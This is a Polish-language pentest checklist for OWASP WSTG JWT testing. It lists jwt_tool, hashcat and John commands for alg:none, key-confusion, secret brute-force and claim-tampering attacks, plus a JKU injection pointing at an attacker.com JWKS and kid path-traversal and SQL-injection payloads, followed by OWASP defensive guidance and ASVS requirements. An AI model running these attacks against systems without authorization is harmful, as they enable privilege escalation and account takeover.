# WSTG-SESS-10 — Testing JSON Web Tokens (JWT)

## Cele

- Okreslenie czy JWT ujawnia wrazliwe informacje
- Testowanie manipulacji i falszyowania tokenow JWT
- Sprawdzenie podatnosci na znane ataki (alg:none, key confusion, brute force)

## KOMENDY

### Dekodowanie JWT (trzy czesci base64)

```bash
echo "JWT_TOKEN_HERE" | cut -d'.' -f1 | base64 -d 2>/dev/null; echo
echo "JWT_TOKEN_HERE" | cut -d'.' -f2 | base64 -d 2>/dev/null; echo

```

### jwt_tool - kompleksowe testowanie JWT

```bash
# Dekodowanie
python3 jwt_tool.py JWT_TOKEN_HERE

# Test alg:none (brak podpisu)
python3 jwt_tool.py JWT_TOKEN_HERE -X a

# Test key confusion RS256 -> HS256
python3 jwt_tool.py JWT_TOKEN_HERE -X k -pk public.pem

# Brute force secret
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/SecLists-master/Passwords/scraped-JWT-secrets.txt

# Manipulacja claimow
python3 jwt_tool.py JWT_TOKEN_HERE -T
python3 jwt_tool.py JWT_TOKEN_HERE -I -pc role -pv admin
python3 jwt_tool.py JWT_TOKEN_HERE -I -pc sub -pv admin

# Test wszystkich znanych atakow
python3 jwt_tool.py JWT_TOKEN_HERE -M at -t TARGET/api/protected -rh "Authorization: Bearer FFF"

```

### jwt-cracker - brute force klucza JWT

```bash
jwt-cracker "JWT_TOKEN_HERE" "abcdefghijklmnopqrstuvwxyz0123456789" 6

```

### Hashcat do lamania JWT secret

```bash
# Tryb 16500 dla JWT (HS256/HS384/HS512)
hashcat -a 0 -m 16500 JWT_TOKEN_HERE Desktop/WSTG/SecLists-master/Passwords/scraped-JWT-secrets.txt

```

### John the Ripper

```bash
echo "JWT_TOKEN_HERE" > jwt_hash.txt
john jwt_hash.txt --wordlist=Desktop/WSTG/SecLists-master/Passwords/scraped-JWT-secrets.txt --format=HMAC-SHA256

```

### Test wygasniecia tokenu (exp claim)

```bash
# Dekoduj i sprawdz pole "exp"
echo "JWT_TOKEN_HERE" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('Exp:', d.get('exp')); import datetime; print('Date:', datetime.datetime.fromtimestamp(d['exp']))"

```

### Test uzycia tokenu po wygasnieciu

```bash
curl -s -H "Authorization: Bearer EXPIRED_JWT_TOKEN" TARGET/api/protected -o /dev/null -w "%{http_code}"

```

### Test JKU/JWK header injection

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -X s -ju "https://attacker.com/jwks.json"

```

### Test kid injection

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py JWT_TOKEN_HERE -I -hc kid -hv "' UNION SELECT 'secret' -- " -S hs256 -p "secret"

```

### Sprawdzenie czy token jest w cookie czy w header

```bash
curl -v TARGET/api/protected 2>&1 | grep -iE "authorization|bearer|jwt"

```

### Test czy serwer akceptuje token bez podpisu

```bash
# Usun trzecia czesc JWT (podpis) i wyslij
HEADER=$(echo "JWT_TOKEN_HERE" | cut -d'.' -f1)
PAYLOAD=$(echo "JWT_TOKEN_HERE" | cut -d'.' -f2)
curl -s -H "Authorization: Bearer ${HEADER}.${PAYLOAD}." TARGET/api/protected -o /dev/null -w "%{http_code}"

```

## KOMENDY Z WORDLISTAMI

### SecLists - scraped JWT secrets do brute force

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/SecLists-master/Passwords/scraped-JWT-secrets.txt

```

### SecLists - common passwords do brute force JWT

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt

```

### SecLists - top passwords

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt

```

### Bug-Bounty-Wordlists - JWT secrets

```bash
python3 jwt_tool.py JWT_TOKEN_HERE -C -d Desktop/WSTG/Bug-Bounty-Wordlists-main/jwt-secrets.txt

```

### Hashcat z roznymi wordlistami

```bash
hashcat -a 0 -m 16500 JWT_TOKEN_HERE Desktop/WSTG/SecLists-master/Passwords/darkc0de.txt
hashcat -a 0 -m 16500 JWT_TOKEN_HERE Desktop/WSTG/Bug-Bounty-Wordlists-main/jwt-secrets.txt

```

### PayloadsAllTheThings - materialy JWT

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/JSON Web Token/README.md
# Zawiera opisy technik ataku na JWT

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Przechwyc JWT z Burp Proxy (naglowek Authorization: Bearer lub cookie)
2. Uzyj jwt.io do dekodowania i analizy struktury tokenu
3. Sprawdz algorytm (alg) w naglowku - RS256, HS256, none?
4. Sprawdz claimy: sub, role, exp, iat, iss, aud
5. Sprawdz czy token zawiera wrazliwe dane (hasla, PII)
6. Przetestuj zmiane claimow w Burp Repeater
7. Sprawdz czy token jest odnawiany (refresh token flow)
8. Przetestuj uzycie wygaslego tokenu
9. Zainstaluj rozszerzenie Burp "JSON Web Tokens" do automatycznej analizy


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — JSON_Web_Token_for_Java_Cheat_Sheet.md

### Atak "alg:none" — brak podpisu

- Atakujacy zmienia `"alg":"HS256"` na `"alg":"none"` — niektoré biblioteki akceptuja token BEZ podpisu
- **Obrona**: JAWNIE wymagaj oczekiwanego algorytmu przy walidacji — `JWT.require(Algorithm.HMAC256(key))`
- Uzywaj biblioteki, ktora NIE jest podatna na ten atak (sprawdz CVE)

### Atak Key Confusion (RS256 → HS256)

- JWT podpisany RS256 (asymetryczny) — atakujacy zmienia na HS256 (symetryczny) i uzywa public key jako secret
- **Obrona**: waliduj algorytm server-side, nie polegaj na `alg` z headera tokenu
- Uzywaj oddzielnych kluczy do HMAC i RSA — nie mieszaj

### Token Sidejacking Prevention

- Dodaj **user context** (fingerprint) do tokenu — losowy string w hardened cookie (`__Secure-Fgp`)
- Przechowuj **SHA-256 hash** fingerprint w JWT (nie raw value — obrona przed XSS)
- Przy walidacji: porownaj hash fingerprint z cookie z hashem w tokenie
- Jesli brak cookie lub hash sie nie zgadza — odrzuc token

### Revokacja tokenow (logout)

- JWT jest **stateless** — domyslnie NIE mozna go uniewaznic
- **Token Denylist**: przechowuj SHA-256 digest odwolanych tokenow w bazie
  - `CREATE TABLE revoked_token(jwt_token_digest VARCHAR(255) PRIMARY KEY, revocation_date TIMESTAMP)`
  - Wpis musi istniec minimum do czasu wygasniecia tokenu
- **Alternatywa**: krotki czas zycia JWT (15 min) + refresh token z mozliwoscia revokacji
- Przy logout: dodaj token do denylist + wyczysc cookie i sessionStorage

### Walidacja claimow — WSZYSTKIE wymagane

- **exp** (expiration): ZAWSZE ustawiaj, krotki czas (15 min dla access token)
- **iss** (issuer): waliduj ze token pochodzi z Twojego serwera
- **aud** (audience): waliduj ze token jest przeznaczony dla Twojej aplikacji
- **nbf** (not before): token nie jest wazny przed ta data
- **iat** (issued at): czas wydania — sprawdz czy nie jest z przyszlosci

### Przechowywanie JWT po stronie klienta

- **sessionStorage** (preferowane dla SPA) — czyszczone po zamknieciu karty
- **NIE localStorage** — dostepne przez JavaScript, podatne na XSS, nie czyszczone automatycznie
- **Cookie z HttpOnly** — bezpieczne ale wymaga CSRF protection
- NIGDY nie przechowuj JWT w URL parametrach

### Silne klucze

- HMAC: min **256 bit** (HS256), **384 bit** (HS384), **512 bit** (HS512)
- RSA: min **2048 bit** (zalecane 4096 bit)
- ECC: **P-256** lub **Curve25519**
- Klucz NIGDY w kodzie zrodlowym — uzywaj secrets manager/vault

### JKU/JWK/KID Injection

- **jku** (JWK Set URL): atakujacy podmienia URL na swoj serwer z wlasnym kluczem
- **kid** (Key ID): moze byc podatny na path traversal (`../../dev/null`) lub SQL injection
- **Obrona**: whitelist dozwolonych URL jku, walidacja kid, nie uzywaj user-controlled header claims

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| JWT Editor | Edycja i testowanie tokenow JWT w Burp | [BApp Store](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) |
| SignSaboteur | Testowanie podatnosci w podpisach JWT | [GitHub](https://github.com/d0ge/sign-saboteur) |
| Session-Handler-Plus | Zaawansowane zarzadzanie sesjami JWT | [GitHub](https://github.com/V9Y1nf0S3C/Session-Handler-Plus) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V9.1.1 | Token source and integrity | Verify that self-contained tokens are validated using their digital signature or MAC to protect against tampering before accepting the token's contents. |
| V9.1.2 | Token source and integrity | Verify that only algorithms on an allowlist can be used to create and verify self-contained tokens, for a given context. The allowlist must include the permitted algorithms, ideally only either symmetric or asymmetric algorithms, and must not include the 'None' algorithm. If both symmetric and asymmetric must be supported, additional controls will be needed to prevent key confusion. |
| V9.1.3 | Token source and integrity | Verify that key material that is used to validate self-contained tokens is from trusted pre-configured sources for the token issuer, preventing attackers from specifying untrusted sources and keys. For JWTs and other JWS structures, headers such as 'jku', 'x5u', and 'jwk' must be validated against an allowlist of trusted sources. |
| V9.2.1 | Token content | Verify that, if a validity time span is present in the token data, the token and its content are accepted only if the verification time is within this validity time span. For example, for JWTs, the claims 'nbf' and 'exp' must be verified. |

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V9.2.2 | Token content | Verify that the service receiving a token validates the token to be the correct type and is meant for the intended purpose before accepting the token's contents. For example, only access tokens can be accepted for authorization decisions and only ID Tokens can be used for proving user authentication. |
| V9.2.3 | Token content | Verify that the service only accepts tokens which are intended for use with that service (audience). For JWTs, this can be achieved by validating the 'aud' claim against an allowlist defined in the service. |
| V9.2.4 | Token content | Verify that, if a token issuer uses the same private key for issuing tokens to different audiences, the issued tokens contain an audience restriction that uniquely identifies the intended audiences. This will prevent a token from being reused with an unintended audience. If the audience identifier is dynamically provisioned, the token issuer must validate these audiences in order to make sure that they do not result in audience impersonation. |
